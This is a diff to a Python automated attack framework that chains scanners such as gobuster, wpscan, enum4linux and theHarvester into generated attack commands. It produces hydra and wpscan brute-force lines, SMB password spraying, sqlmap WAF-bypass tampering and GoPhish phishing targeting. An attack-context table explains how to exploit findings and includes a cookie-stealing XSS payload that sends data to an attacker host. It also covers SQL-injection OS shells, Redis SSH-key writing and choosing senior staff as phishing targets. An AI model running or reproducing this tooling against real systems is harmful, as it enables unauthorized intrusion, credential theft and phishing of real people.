@@ -36,9 +36,10 @@ def _finding(severity, title, detail, evidence="", module=""):
     return {"severity": severity, "title": title, "detail": detail,
             "evidence": evidence, "module": module}
 
-def _attack(name, desc, command, risk, category):
+def _attack(name, desc, command, risk, category, context="", look_for=""):
     return {"name": name, "description": desc, "command": command,
-            "risk": risk, "category": category}
+            "risk": risk, "category": category,
+            "context": context, "look_for": look_for}
 
 def _tool(name):
     return shutil.which(name) is not None
@@ -520,25 +521,619 @@ def mod_commix(target, tt):
 
 
 # ══════════════════════════════════════════════════════════════════════════════
+# NEW MODULES — Additional scanners leveraging the full arsenal
+# ══════════════════════════════════════════════════════════════════════════════
+
+def mod_gobuster(target, tt):
+    """Directory/file brute force with gobuster (faster than dirb)."""
+    if not _tool("gobuster"):
+        return {"raw_output": "gobuster not installed", "findings": [], "attacks": [], "skipped": True}
+    url = _url(target)
+    F, A = [], []
+    wordlists = [
+        "/usr/share/wordlists/dirb/common.txt",
+        "/usr/share/dirb/wordlists/common.txt",
+        "/usr/share/seclists/Discovery/Web-Content/common.txt",
+        "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt",
+    ]
+    wl = next((w for w in wordlists if os.path.isfile(w)), None)
+    if not wl:
+        return {"raw_output": "No wordlist found for gobuster", "findings": [], "attacks": []}
+    s,e,_ = _run(f"gobuster dir -u {url} -w {wl} -q -t 20 --no-error -z 2>&1 | head -150", 240)
+    out = s + e
+    for match in re.findall(r'(/\S+)\s+\(Status:\s*(\d+)', out):
+        path, code = match[0], int(match[1])
+        if code in (200, 301, 302, 403):
+            F.append(_finding("info", f"Path: {path} [{code}]", "Found by Gobuster", module="Gobuster"))
+            if any(p in path.lower() for p in ["/admin","/login","/wp-admin","/manager","/dashboard","/panel","/cpanel","/phpmyadmin","/signin","/auth"]):
+                F.append(_finding("high", f"Admin/Login: {path}", f"HTTP {code}", module="Gobuster"))
+                A.append(_attack(f"Brute force {path}", f"Login page at {path}",
+                    f"hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/dirb/others/best15.txt {_domain(target)} http-post-form '{path}:username=^USER^&password=^PASS^:invalid'",
+                    "high", "brute_force",
+                    context=f"Gobuster discovered a login/admin page at {path}. This attack uses Hydra to test common username and password combinations against the login form.",
+                    look_for="Look for lines with '[80][http-post-form]' followed by 'login:' and 'password:' — these are confirmed credential pairs."))
+            if any(p in path.lower() for p in ["/backup","/.git","/.env","/config","/.svn","/db","/database","/dump",".sql",".bak"]):
+                F.append(_finding("critical", f"Sensitive: {path}", f"HTTP {code}", module="Gobuster"))
+                A.append(_attack(f"Download {path}", "Potentially sensitive file",
+                    f"curl -sk {url}{path}", "critical", "info_disclosure",
+                    context=f"A sensitive path '{path}' was discovered. This may contain config files, database backups, source code, or credentials.",
+                    look_for="Examine the content for passwords, API keys, database connection strings, or internal configuration data."))
+    # Also look for gobuster's alternate output format
+    for match in re.findall(r'(https?://\S+)\s+\(Status:\s*(\d+)', out):
+        found_url, code = match[0], int(match[1])
+        path = urllib.parse.urlparse(found_url).path
+        if code == 200 and path not in ("/",):
+            F.append(_finding("info", f"URL: {path} [{code}]", found_url, module="Gobuster"))
+    return {"raw_output": out[:5000], "findings": F, "attacks": A}
+
+
+def mod_wpscan(target, tt):
+    """WordPress vulnerability scanning and user enumeration."""
+    if not _tool("wpscan"):
+        return {"raw_output": "wpscan not installed", "findings": [], "attacks": [], "skipped": True}
+    url = _url(target)
+    F, A = [], []
+    # Quick check if target is WordPress
+    is_wp = False
+    if requests:
+        try:
+            r = requests.get(url, timeout=8, verify=False)
+            if any(sig in r.text for sig in ["/wp-content/","/wp-includes/","wp-login"]):
+                is_wp = True
+        except Exception:
+            pass
+        if not is_wp:
+            try:
+                r2 = requests.get(f"{url}/wp-login.php", timeout=5, verify=False)
+                if r2.status_code == 200 and "wp-login" in r2.text.lower():
+                    is_wp = True
+            except Exception:
+                pass
+    if not is_wp:
+        return {"raw_output": "Not a WordPress site — skipping WPScan", "findings": [], "attacks": []}
+
+    s,e,_ = _run(f"wpscan --url {url} --enumerate u,vp,vt --no-banner --random-user-agent --disable-tls-checks 2>&1 | head -200", 300)
+    out = s + e
+    F.append(_finding("info", "WordPress detected", "WPScan ran full enumeration", module="WPScan"))
+
+    # Extract users
+    wp_users = []
+    for user_match in re.findall(r'\[.\]\s+(\S+)', out):
+        # WPScan user output patterns
+        pass
+    for m in re.finditer(r'(?:identified|found|login|user(?:name)?)\s*[:=]?\s*(\w{2,20})', out, re.I):
+        u = m.group(1).lower()
+        if u not in ("the","this","that","with","from","was","are","been","has","have","not","for","and","but",
+                      "all","can","had","her","one","our","out","you","http","https","true","false","null","none") and u not in wp_users:
+            wp_users.append(u)
+
+    # Parse WPScan's user table format: | username |
+    for m in re.findall(r'\|\s+([a-zA-Z][\w.-]{1,19})\s+\|', out):
+        if m.lower() not in wp_users:
+            wp_users.append(m.lower())
+
+    for u in wp_users:
+        F.append(_finding("high", f"WP User: {u}", "Enumerated by WPScan", module="WPScan"))
+
+    # Extract vulnerabilities
+    for vuln in re.findall(r'Title:\s*(.+)', out):
+        F.append(_finding("high", f"WP Vuln: {vuln.strip()}", "Detected by WPScan", module="WPScan"))
+    for cve in set(re.findall(r'(CVE-\d{4}-\d+)', out)):
+        F.append(_finding("critical", f"CVE: {cve}", "Found in WordPress component", module="WPScan"))
+        A.append(_attack(f"Exploit {cve}", "WordPress CVE", f"searchsploit {cve}", "critical", "exploitation",
+            context=f"WPScan found {cve} in a WordPress component. Searchsploit searches for publicly available exploit code for this vulnerability.",
+            look_for="Look for exploit entries — note the path and EDB-ID. Use 'searchsploit -m ID' to download the exploit code."))
+
+    # Plugin/theme vulns
+    if "outdated" in out.lower() or "insecure" in out.lower():
+        F.append(_finding("medium", "Outdated WP components", "Update plugins/themes", module="WPScan"))
+
+    if wp_users:
+        user_list = ",".join(wp_users[:10])
+        A.append(_attack("WP password brute force", f"Users: {', '.join(wp_users[:5])}",
+            f"wpscan --url {url} -U {user_list} -P /usr/share/wordlists/rockyou.txt --max-threads 5 --password-attack wp-login",
+            "high", "brute_force",
+            context=f"Found {len(wp_users)} WordPress user(s): {', '.join(wp_users[:5])}. This brute forces passwords using the rockyou wordlist against the WordPress login.",
+            look_for="Look for 'Valid Combinations Found' section. Successful logins show as 'Username: xxx, Password: xxx' — these are confirmed admin credentials."))
+
+    return {"raw_output": out[:5000], "findings": F, "attacks": A}
+
+
+def mod_wafw00f(target, tt):
+    """WAF (Web Application Firewall) detection."""
+    if not _tool("wafw00f"):
+        return {"raw_output": "wafw00f not installed", "findings": [], "attacks": [], "skipped": True}
+    url = _url(target)
+    F, A = [], []
+    s,e,_ = _run(f"wafw00f {url} -a 2>&1", 60)
+    out = s + e
+    wafs = re.findall(r'is behind\s+(.+?)(?:\s+WAF)?$', out, re.M|re.I)
+    if wafs:
+        for w in wafs:
+            F.append(_finding("info", f"WAF detected: {w.strip()}", "May block attack payloads", module="WAF"))
+        A.append(_attack("WAF bypass testing", f"WAF: {', '.join(w.strip() for w in wafs)}",
+            f"sqlmap -u '{url}/?id=1' --tamper=between,randomcase,space2comment --batch",
+            "medium", "evasion",
+            context=f"A WAF ({', '.join(w.strip() for w in wafs)}) is protecting this target. SQLMap tamper scripts attempt to encode payloads to bypass WAF rules.",
+            look_for="If SQLMap reports 'injectable' despite the WAF, the bypass works. If blocked, try different tamper scripts: charencode, apostrophemask, percentage."))
+    elif "no waf" in out.lower() or "not behind" in out.lower():
+        F.append(_finding("info", "No WAF detected", "Target is unprotected by WAF", module="WAF"))
+    return {"raw_output": out[:3000], "findings": F, "attacks": A}
+
+
+def mod_admin_enum(target, tt):
+    """Find admin/login pages and enumerate usernames."""
+    if not requests:
+        return {"raw_output": "requests unavailable", "findings": [], "attacks": []}
+    url = _url(target)
+    domain = _domain(target)
+    F, A, out = [], [], []
+
+    # Phase 1: Discover login/admin pages
+    admin_paths = [
+        "/admin", "/administrator", "/admin/login", "/admin.php",
+        "/wp-admin", "/wp-login.php", "/user/login", "/login", "/login.php",
+        "/cpanel", "/phpmyadmin", "/manager", "/dashboard", "/panel",
+        "/auth/login", "/accounts/login", "/signin", "/portal", "/admin/index.php",
+        "/webadmin", "/siteadmin", "/moderator", "/controlpanel",
+        "/wp-admin/admin-ajax.php", "/admin/dashboard", "/backoffice",
+    ]
+    found_logins = []
+    for path in admin_paths:
+        try:
+            r = requests.get(f"{url}{path}", timeout=4, verify=False, allow_redirects=True)
+            if r.status_code == 200 and len(r.text) > 200:
+                has_form = any(kw in r.text.lower() for kw in ["password","login","sign in","log in","username","passwd","<form"])
+                if has_form:
+                    F.append(_finding("high", f"Login page: {path}", f"HTTP {r.status_code}", module="AdminEnum"))
+                    found_logins.append((path, r.text))
+                    out.append(f"[+] Login found: {path}")
+        except Exception:
+            pass
+
+    # Phase 2: WordPress REST API user enumeration
+    wp_users = []
+    try:
+        r = requests.get(f"{url}/wp-json/wp/v2/users", timeout=8, verify=False)
+        if r.status_code == 200:
+            try:
+                users_data = r.json()
+                for u in users_data:
+                    name = u.get("slug") or u.get("name","")
+                    if name and name not in wp_users:
+                        wp_users.append(name)
+                        F.append(_finding("high", f"Username: {name}", "Enumerated via WP REST API (/wp-json/wp/v2/users)", module="AdminEnum"))
+                        out.append(f"[+] WordPress user (REST API): {name}")
+            except Exception:
+                pass
+    except Exception:
+        pass
+
+    # Phase 3: WordPress author enumeration (?author=N)
+    for i in range(1, 11):
+        try:
+            r = requests.get(f"{url}/?author={i}", timeout=4, verify=False, allow_redirects=True)
+            m = re.search(r'/author/([^/]+)/', r.url)
+            if m:
+                uname = m.group(1)
+                if uname not in wp_users:
+                    wp_users.append(uname)
+                    F.append(_finding("high", f"Username: {uname}", f"Enumerated via ?author={i}", module="AdminEnum"))
+                    out.append(f"[+] WordPress user (author={i}): {uname}")
+            elif r.status_code == 200:
+                tm = re.search(r'<title>\s*(.+?)\s*[|<]', r.text)
+                if tm and tm.group(1).strip() and len(tm.group(1).strip()) < 30:
+                    possible_name = tm.group(1).strip().lower().replace(" ","-")
+                    if possible_name and possible_name not in wp_users and "/" not in possible_name:
+                        wp_users.append(possible_name)
+                        out.append(f"[?] Possible user from title: {possible_name}")
+        except Exception:
+            pass
+
+    # Phase 4: Username enumeration via login form response differencing
+    enum_users = []
+    for login_path, html in found_logins[:2]:
+        try:
+            form_action = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', html, re.I)
+            action_url = form_action.group(1) if form_action else login_path
+            if not action_url.startswith("http"):
+                action_url = f"{url}{action_url}" if action_url.startswith("/") else f"{url}/{action_url}"
+
+            inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', html, re.I)
+            user_field = next((i for i in inputs if any(u in i.lower() for u in ["user","login","email","name","usr","account"])), None)
+            pass_field = next((i for i in inputs if any(p in i.lower() for p in ["pass","pwd","secret","pw"])), None)
+
+            if not user_field or not pass_field:
+                continue
+
+            # Baseline: test a definitely-nonexistent user
+            baseline = requests.post(action_url, data={user_field: "zzz_no_user_exists_zzz_42", pass_field: "wrongpass123!"},
+                                     timeout=6, verify=False, allow_redirects=False)
+            baseline_len = len(baseline.text)
+            baseline_code = baseline.status_code
+
+            common_users = ["admin","administrator","root","user","test","guest","info",
+                            "webmaster","support","manager","demo","operator","sysadmin","superadmin"]
+            for uname in common_users:
+                try:
+                    r2 = requests.post(action_url, data={user_field: uname, pass_field: "wrongpass123!"},
+                                       timeout=6, verify=False, allow_redirects=False)
+                    diff = abs(len(r2.text) - baseline_len)
+                    if diff > 30 or r2.status_code != baseline_code:
+                        if uname not in enum_users:
+                            enum_users.append(uname)
+                            F.append(_finding("high", f"Valid username: {uname}",
+                                f"Login form at {login_path} responds differently for this user (response diff: {diff} chars)",
+                                module="AdminEnum"))
+                            out.append(f"[+] Valid username (form enum): {uname} at {login_path} (diff={diff})")
+                except Exception:
+                    pass
+        except Exception:
+            pass
+
+    # Generate attacks from findings
+    all_users = list(dict.fromkeys(wp_users + enum_users))  # dedupe, preserve order
+    if all_users:
+        user_str = ",".join(all_users[:15])
+        if wp_users:
+            A.append(_attack("WP user brute force", f"Users: {', '.join(all_users[:5])}",
+                f"wpscan --url {url} -U {user_str} -P /usr/share/wordlists/rockyou.txt --max-threads 5",
+                "high", "brute_force",
+                context=f"Enumerated {len(all_users)} username(s): {', '.join(all_users[:5])}. This brute forces WordPress login with the rockyou wordlist.",
+                look_for="Look for 'Valid Combinations Found' — each entry shows Username and Password. These are confirmed admin credentials for the WordPress site."))
+        for path, _ in found_logins[:2]:
+            A.append(_attack(f"Login brute force ({path})", f"Users: {', '.join(all_users[:3])}",
+                f"hydra -L /tmp/users.txt -P /usr/share/wordlists/rockyou.txt {domain} http-post-form '{path}:username=^USER^&password=^PASS^:invalid' -t 4",
+                "high", "brute_force",
+                context=f"Enumerated usernames ({', '.join(all_users[:3])}) will be tested against the login form at {path} using common passwords.",
+                look_for="Look for '[80][http-post-form]' lines with 'login:' and 'password:' entries. Each is a confirmed credential pair for the admin panel."))
+
+    if found_logins and not all_users:
+        for path, _ in found_logins[:2]:
+            A.append(_attack(f"Login brute force ({path})", f"Admin panel at {path}",
+                f"hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/dirb/others/best15.txt {domain} http-post-form '{path}:username=^USER^&password=^PASS^:invalid' -t 4",
+                "high", "brute_force",
+                context=f"A login form was found at {path}. No usernames were enumerated, so this uses a common username list against the form.",
+                look_for="Look for '[80][http-post-form]' lines with successful logins showing 'login:' and 'password:' values."))
+
+    return {"raw_output": "\n".join(out) if out else "No admin pages or usernames found", "findings": F, "attacks": A}
+
+
+def mod_masscan(target, tt):
+    """Ultra-fast port scanner (complements nmap)."""
+    if not _tool("masscan"):
+        return {"raw_output": "masscan not installed", "findings": [], "attacks": [], "skipped": True}
+    host = _domain(target) if tt in ("domain","url") else target
+    F, A = [], []
+    s,e,_ = _run(f"masscan {host} -p1-10000 --rate=1000 --wait 3 2>&1 | head -100", 120)
+    out = s + e
+    ports_found = []
+    for port_s, proto in re.findall(r'port\s+(\d+)/(tcp|udp)', out):
+        port = int(port_s)
+        ports_found.append(port)
+        F.append(_finding("info", f"Port {port}/{proto} open", "Masscan fast discovery", module="Masscan"))
+    if ports_found:
+        port_list = ",".join(str(p) for p in sorted(ports_found)[:50])
+        A.append(_attack("Deep scan open ports", f"{len(ports_found)} ports found",
+            f"nmap -sV -sC -p {port_list} {host}",
+            "medium", "recon",
+            context=f"Masscan quickly found {len(ports_found)} open port(s). This nmap command does deep service version detection and script scanning on each discovered port.",
+            look_for="Look for service names and versions next to each port. Check for outdated software versions which may have known CVEs."))
+    return {"raw_output": out[:3000], "findings": F, "attacks": A}
+
+
+def mod_enum4linux(target, tt):
+    """SMB/Windows enumeration — users, shares, groups, password policy."""
+    if not _tool("enum4linux"):
+        return {"raw_output": "enum4linux not installed", "findings": [], "attacks": [], "skipped": True}
+    host = _domain(target) if tt in ("domain","url") else target
+    F, A = [], []
+    # Only run if port 445 or 139 likely open
+    smb_open = False
+    for port in (445, 139):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2)
+            if s.connect_ex((host, port)) == 0:
+                smb_open = True
+            s.close()
+        except Exception:
+            pass
+    if not smb_open:
+        return {"raw_output": "SMB ports (445/139) not open — skipping", "findings": [], "attacks": []}
+
+    s,e,_ = _run(f"enum4linux -a {host} 2>&1 | head -200", 180)
+    out = s + e
+
+    # Extract users
+    smb_users = []
+    for m in re.finditer(r'user:\[([^\]]+)\]', out, re.I):
+        u = m.group(1)
+        if u not in smb_users:
+            smb_users.append(u)
+            F.append(_finding("high", f"SMB User: {u}", "Enumerated via enum4linux", module="Enum4Linux"))
+
+    # Extract shares
+    for m in re.finditer(r'(\S+)\s+Disk\s', out):
+        share = m.group(1)
+        F.append(_finding("medium", f"SMB Share: {share}", "Network file share", module="Enum4Linux"))
+
+    # Password policy
+    if "minimum password length" in out.lower():
+        pm = re.search(r'minimum password length\s*=\s*(\d+)', out, re.I)
+        if pm:
+            F.append(_finding("info", f"Min password length: {pm.group(1)}", "SMB password policy", module="Enum4Linux"))
+            if int(pm.group(1)) < 8:
+                F.append(_finding("medium", "Weak password policy", f"Min length only {pm.group(1)} chars", module="Enum4Linux"))
+
+    if "account lockout threshold" in out.lower():
+        lt = re.search(r'account lockout threshold\s*=\s*(\d+)', out, re.I)
+        if lt and int(lt.group(1)) == 0:
+            F.append(_finding("medium", "No account lockout", "Brute force is feasible", module="Enum4Linux"))
+            if smb_users:
+                A.append(_attack("SMB password spray", f"Users: {', '.join(smb_users[:5])}",
+                    f"hydra -L /tmp/smb_users.txt -P /usr/share/wordlists/dirb/others/best15.txt smb://{host}",
+                    "high", "brute_force",
+                    context=f"Found {len(smb_users)} user(s) with no account lockout policy. Hydra will test common passwords against each user via SMB.",
+                    look_for="Look for '[445][smb]' lines with 'login:' and 'password:' entries. Successful SMB credentials may give access to file shares or domain resources."))
+
+    if smb_users:
+        A.append(_attack("SMB user password attack", f"{len(smb_users)} users found",
+            f"crackmapexec smb {host} -u /tmp/smb_users.txt -p /usr/share/wordlists/dirb/others/best15.txt",
+            "high", "brute_force",
+            context=f"Enum4linux found {len(smb_users)} user account(s). CrackMapExec tests credential combos efficiently against SMB.",
+            look_for="Lines marked with [+] and showing 'Pwn3d!' indicate admin-level credentials. Lines with valid credentials show the username and password."))
+
+    return {"raw_output": out[:5000], "findings": F, "attacks": A}
+
+
+def mod_dnstwist(target, tt):
+    """Typosquatting and phishing domain detection."""
+    dt = _tpath("dnstwist")
+    if not dt and not _tool("dnstwist"):
+        return {"raw_output": "dnstwist not installed", "findings": [], "attacks": [], "skipped": True}
+    domain = _domain(target)
+    F, A = [], []
+    cmd = f"cd {dt} && python3 dnstwist.py -r {domain} 2>&1 | head -60" if dt else f"dnstwist -r {domain} 2>&1 | head -60"
+    s,e,_ = _run(cmd, 120)
+    out = s + e
+    lookalikes = []
+    for ln in out.split("\n"):
+        parts = ln.split()
+        if len(parts) >= 2 and "." in parts[1] and parts[1] != domain:
+            lookalike = parts[1].strip()
+            if lookalike.endswith(domain.split(".")[-1]) or "." in lookalike:
+                lookalikes.append(lookalike)
+                F.append(_finding("info", f"Lookalike: {lookalike}", ln.strip(), module="DNSTwist"))
+    active = [l for l in out.split("\n") if re.search(r'\d+\.\d+\.\d+\.\d+', l)]
+    if active:
+        F.append(_finding("medium", f"{len(active)} active lookalike domains", "Could be used for phishing", module="DNSTwist"))
+        A.append(_attack("Investigate lookalikes", f"{len(active)} active typosquatting domains",
+            f"dnstwist -r {domain} --whois",
+            "medium", "recon",
+            context=f"Found {len(active)} registered lookalike domains for {domain}. These could be used by attackers for phishing or brand impersonation.",
+            look_for="Look for domains with IP addresses — these are active and potentially malicious. Check WHOIS data for suspicious registrants."))
+    return {"raw_output": out[:3000], "findings": F, "attacks": A}
+
+
+def mod_theharvester(target, tt):
+    """Email, host, and subdomain harvesting from OSINT sources."""
+    found_cmd = None
+    for name in ("theHarvester","theharvester"):
+        if _tool(name):
+            found_cmd = name
+            break
+    if not found_cmd:
+        return {"raw_output": "theHarvester not installed", "findings": [], "attacks": [], "skipped": True}
+    domain = _domain(target)
+    F, A = [], []
+    s,e,_ = _run(f"{found_cmd} -d {domain} -l 200 -b all 2>&1 | tail -80", 180)
+    out = s + e
+
+    # Extract emails
+    emails = set(re.findall(r'[\w.+-]+@[\w.-]+\.\w+', out))
+    for em in emails:
+        F.append(_finding("info", f"Email: {em}", "Harvested from OSINT sources", module="Harvester"))
+
+    # Extract hosts/IPs
+    hosts = set(re.findall(r'(\d+\.\d+\.\d+\.\d+)', out))
+    for h in hosts:
+        F.append(_finding("info", f"Host IP: {h}", "Found by theHarvester", module="Harvester"))
+
+    # Extract subdomains
+    subs = set(re.findall(r'([a-zA-Z0-9][\w.-]*\.' + re.escape(domain) + r')', out))
+    for sub in sorted(subs):
+        F.append(_finding("info", f"Subdomain: {sub}", "Harvested", module="Harvester"))
+
+    if emails:
+        A.append(_attack("Targeted phishing", f"{len(emails)} emails found",
+            f"Use GoPhish with harvested emails from {domain}",
+            "medium", "social_engineering",
+            context=f"theHarvester found {len(emails)} email address(es) associated with {domain}. These can be used for targeted phishing or password spraying.",
+            look_for="Each email is a potential target. Cross-reference with LinkedIn for role-based targeting. Senior staff and IT admins are high-value targets."))
+
+    return {"raw_output": out[:4000], "findings": F, "attacks": A}
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Attack Context Enrichment — adds explanation to attacks from existing modules
+# ══════════════════════════════════════════════════════════════════════════════
+
+ATTACK_CONTEXT = {
+    "Email Spoofing": {
+        "context": "SPF uses soft fail (~all) which allows forged emails from this domain. An attacker can send emails impersonating the organization.",
+        "look_for": "Test by sending a spoofed email to yourself. With SPF soft fail, emails often land in spam but are still delivered to the target."
+    },
+    "Email Spoofing (no DMARC)": {
+        "context": "No DMARC record exists — anyone can send emails appearing to be from this domain. This is the #1 enabler of phishing attacks.",
+        "look_for": "Configure GoPhish or SET with the target domain. Without DMARC enforcement, spoofed emails reach the inbox more reliably."
+    },
+    "Exploit old server": {
+        "context": "The web server runs an outdated version with known CVEs. Searchsploit searches the Exploit-DB archive for public exploit code.",
+        "look_for": "Look for 'Remote Code Execution' or 'File Read' exploits. Note the EDB-ID — download with 'searchsploit -m EDB_ID'."
+    },
+    "Clickjacking": {
+        "context": "No X-Frame-Options or CSP frame-ancestors header — the page can be embedded in an iframe for clickjacking attacks.",
+        "look_for": "If the page loads inside the iframe, it's vulnerable. Victims can be tricked into clicking hidden buttons overlaid on the framed page."
+    },
+    "SSL Stripping": {
+        "context": "No HSTS header means browsers don't enforce HTTPS. On the same network, an attacker can downgrade connections to HTTP and intercept traffic.",
+        "look_for": "With sslstrip or bettercap on the same network, you'll see plaintext HTTP traffic including login credentials and session tokens."
+    },
+    "Cookie theft via XSS": {
+        "context": "Session cookies lack HttpOnly — JavaScript can read them. Any XSS vulnerability can steal user sessions by exfiltrating document.cookie.",
+        "look_for": "If you find an XSS point, inject: <script>fetch('http://YOUR_IP/'+document.cookie)</script> — check your listener for the session cookie."
+    },
+    "WPScan": {
+        "context": "WordPress CMS detected. WPScan enumerates plugins, themes, and users, checking each for known vulnerabilities.",
+        "look_for": "Look for [!] (vulnerability warnings), [+] (users found), and red-highlighted CVEs. Outdated plugins are the most common attack vector."
+    },
+    "FTP anonymous login": {
+        "context": "Tests if FTP allows login without credentials. Anonymous FTP often exposes sensitive files, backups, or writable directories.",
+        "look_for": "If '230 Login successful' appears, you're in. Run 'ls -la' and 'cd' to browse. Look for config files, backups, and source code."
+    },
+    "FTP brute force": {
+        "context": "Hydra tests username/password combinations against FTP. Successful login can give read/write access to server files.",
+        "look_for": "Lines with '[21][ftp]' show attempts. Successful: 'host: X  login: USER  password: PASS' — these are working FTP credentials."
+    },
+    "SSH brute force": {
+        "context": "Hydra tests credentials against SSH. Successful login gives full remote shell access to the server.",
+        "look_for": "Lines with '[22][ssh]' followed by 'login:' and 'password:' are confirmed credentials. Each one gives remote terminal access."
+    },
+    "Exploit old SSH": {
+        "context": "Outdated OpenSSH with known vulnerabilities. Searchsploit finds public exploits for this version.",
+        "look_for": "Look for 'Remote' exploits — these work without credentials. Download with 'searchsploit -m EDB_ID'."
+    },
+    "MySQL brute force": {
+        "context": "MySQL is exposed to the network. Hydra tests common credentials. Successful login exposes all database contents.",
+        "look_for": "Lines with '[3306][mysql]' show results. Success: 'login: USER  password: PASS' — use 'mysql -h HOST -u USER -p' to connect."
+    },
+    "PostgreSQL brute force": {
+        "context": "PostgreSQL is directly accessible. Hydra tests credentials. PostgreSQL can also execute OS commands via COPY TO/FROM PROGRAM.",
+        "look_for": "Look for '[5432][postgres]' success lines. PostgreSQL access can escalate to OS command execution."
+    },
+    "BlueKeep check": {
+        "context": "Scans for CVE-2019-0708 (BlueKeep) — a critical unauthenticated RCE in Remote Desktop (RDP).",
+        "look_for": "Look for 'VULNERABLE' in the output. If found, the target can be fully compromised without credentials via RDP."
+    },
+    "EternalBlue check": {
+        "context": "Scans for MS17-010 (EternalBlue) in SMB — the vulnerability behind WannaCry ransomware. Allows unauthenticated remote code execution.",
+        "look_for": "Look for 'VULNERABLE' in the nmap script output. This is a critical finding — full remote code execution without any credentials."
+    },
+    "SMB enum shares": {
+        "context": "Lists SMB network shares without credentials. Exposed shares may contain sensitive documents, configs, or writable directories.",
+        "look_for": "Look for share names and access levels. Shares marked 'READ' or with no password are directly browsable. ADMIN$ and C$ indicate admin access."
+    },
+    "Redis unauth access": {
+        "context": "Redis is exposed and likely has no authentication. Unauthenticated Redis can read/write data and potentially write SSH keys for shell access.",
+        "look_for": "If you get a Redis prompt, run: INFO (server details), KEYS * (list data), CONFIG GET dir (check filesystem access)."
+    },
+    "MongoDB unauth access": {
+        "context": "MongoDB is exposed and may have no auth enabled. Unauthenticated access allows dumping all databases and collections.",
+        "look_for": "Run 'show dbs', then 'use DBNAME' and 'db.getCollectionNames()'. Look for user tables with credentials."
+    },
+    "SQLi dump database": {
+        "context": "SQL injection was confirmed. This dumps all database contents — tables, columns, and data including credentials.",
+        "look_for": "SQLMap shows tables as they're dumped. Focus on 'users', 'accounts', 'admin' tables. Password hashes can be cracked with hashcat."
+    },
+    "SQLi OS shell": {
+        "context": "Escalates SQL injection to operating system command execution. If the DB user has FILE privileges, this provides a system shell.",
+        "look_for": "If 'os-shell>' appears, you have command execution. Run 'id' and 'whoami' to check privilege level."
+    },
+    "XSS exploitation": {
+        "context": "XSStrike confirmed XSS vulnerability. Cross-site scripting enables session hijacking, keylogging, and phishing via injected JavaScript.",
+        "look_for": "Look for payloads marked 'Vulnerable'. Test in browser. Use the payload for session stealing: fetch('http://ATTACKER/'+document.cookie)."
+    },
+    "Command injection -> shell": {
+        "context": "Commix confirmed OS command injection. Arbitrary system commands can be executed on the server — effectively full server compromise.",
+        "look_for": "The 'id' output shows the server user. 'uid=0(root)' means root access. Otherwise, note the user for privilege escalation."
+    },
+    "Social engineering recon": {
+        "context": "Sherlock found social media accounts for this username. These profiles provide intelligence for targeted social engineering attacks.",
+        "look_for": "Review profiles for personal info: full name, employer, location, interests. This data crafts convincing phishing pretexts."
+    },
+    "Phishing campaign": {
+        "context": "Gathered email intelligence enables targeted phishing. GoPhish tracks email opens, link clicks, and credential submissions.",
+        "look_for": "In GoPhish dashboard, monitor: email opens (tracking pixel), link clicks, and submitted credentials from the phishing page."
+    },
+    "Password spray": {
+        "context": "Tests a few common passwords across many accounts. Avoids lockouts while finding weak/default passwords across the organization.",
+        "look_for": "Successful logins indicate weak passwords. Try: 'Password1!', 'Company2024!', 'Welcome1!', and seasonal variations."
+    },
+    "POODLE": {
+        "context": "SSLv3 is enabled — vulnerable to POODLE (Padding Oracle On Downgraded Legacy Encryption). Can decrypt encrypted traffic.",
+        "look_for": "If successful, decrypted bytes from the SSL session appear. This reveals session cookies, credentials, and sensitive data."
+    },
+    "Subdomain takeover check": {
+        "context": "Checks subdomains for dangling CNAME records pointing to unclaimed cloud services. A takeover lets you host content on the victim's subdomain.",
+        "look_for": "Check each CNAME target. If pointing to GitHub Pages, Heroku, AWS S3, etc. that returns 404 — the subdomain is likely takeover-able."
+    },
+    "Browse exposed dirs": {
+        "context": "Directory listing is enabled — the server shows all files in the directory. This exposes the file structure and all contents.",
+        "look_for": "Look for: backup files (.tar.gz, .zip, .sql), config files (.conf, .env, .ini), source code, database dumps, and credentials."
+    },
+    "Admin brute force": {
+        "context": "An admin panel was discovered with a login form. Hydra systematically tests username/password combinations.",
+        "look_for": "Look for '[http-post-form]' lines with 'login:' and 'password:' values — these are working admin credentials."
+    },
+}
+
+def _enrich_attacks(attacks):
+    """Add context and look_for to attacks that don't have them."""
+    for a in attacks:
+        if not a.get("context") and a["name"] in ATTACK_CONTEXT:
+            a["context"] = ATTACK_CONTEXT[a["name"]].get("context", "")
+            a["look_for"] = ATTACK_CONTEXT[a["name"]].get("look_for", "")
+        # Fallback: generate basic context from category
+        if not a.get("context"):
+            cat_context = {
+                "brute_force": f"This attack tests credential combinations against the target service. Hydra or similar tools systematically try username/password pairs.",
+                "exploitation": f"This attempts to exploit a known vulnerability in the target. Success may grant remote access or data exposure.",
+                "recon": f"This gathers additional intelligence about the target's infrastructure, services, or configuration.",
+                "injection": f"This exploits an injection vulnerability to execute unauthorized commands or queries on the target.",
+                "social_engineering": f"This leverages gathered intelligence to craft social engineering attacks against the target's users.",
+                "client_side": f"This exploits a client-side vulnerability that affects users who visit or interact with the target.",
+                "network": f"This exploits a network-level vulnerability, typically requiring proximity or MITM position on the target's network.",
+                "info_disclosure": f"This accesses exposed sensitive information that should not be publicly accessible.",
+                "access": f"This attempts to gain unauthorized access to an exposed service using default or no credentials.",
+                "evasion": f"This attempts to bypass security controls (WAF, IDS) protecting the target.",
+            }
+            a["context"] = cat_context.get(a.get("category",""), "Executes the specified command against the target.")
+            a["look_for"] = a.get("look_for", "Review the command output for successful results, error messages, and any sensitive data revealed.")
+
+
+# ══════════════════════════════════════════════════════════════════════════════
 # Module Registry
 # ══════════════════════════════════════════════════════════════════════════════
 
 MODULES = [
-    {"id":"dns",        "name":"DNS & WHOIS Recon",        "fn":mod_dns,        "types":["domain","url"],             "phase":"recon"},
-    {"id":"headers",    "name":"HTTP Security Headers",    "fn":mod_headers,    "types":["domain","url"],             "phase":"recon"},
-    {"id":"ssl",        "name":"SSL/TLS Analysis",         "fn":mod_ssl,        "types":["domain","url"],             "phase":"recon"},
-    {"id":"robots",     "name":"Robots & Sitemap",         "fn":mod_robots,     "types":["domain","url"],             "phase":"recon"},
